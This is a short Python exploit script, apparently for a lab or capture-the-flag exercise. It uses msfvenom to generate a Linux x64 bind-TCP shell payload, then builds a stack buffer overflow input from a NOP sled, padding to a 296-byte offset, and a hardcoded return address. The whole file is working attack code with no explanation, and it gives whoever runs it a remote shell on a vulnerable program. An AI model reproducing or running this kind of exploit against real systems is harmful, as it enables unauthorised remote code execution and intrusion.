#!/usr/bin/env python3
import sys, subprocess as sp
from struct import pack

cp = sp.run(
    "msfvenom --platform linux --arch x64 --bad-chars '\\x00' " +
    "--payload linux/x64/shell/bind_tcp --format hex", 
    stdout=sp.PIPE, stderr=sp.PIPE, shell=True, check=True
)
buf = bytes.fromhex(cp.stdout.decode())

distance_to_ra = 296
nopsled = b"\x90" * 60
padding_length = distance_to_ra - len(nopsled) - len(buf)
padding = b"A" * padding_length

address = pack("<Q", 0x7fffffffe792)

sys.stdout.buffer.write(nopsled + buf + padding + address)
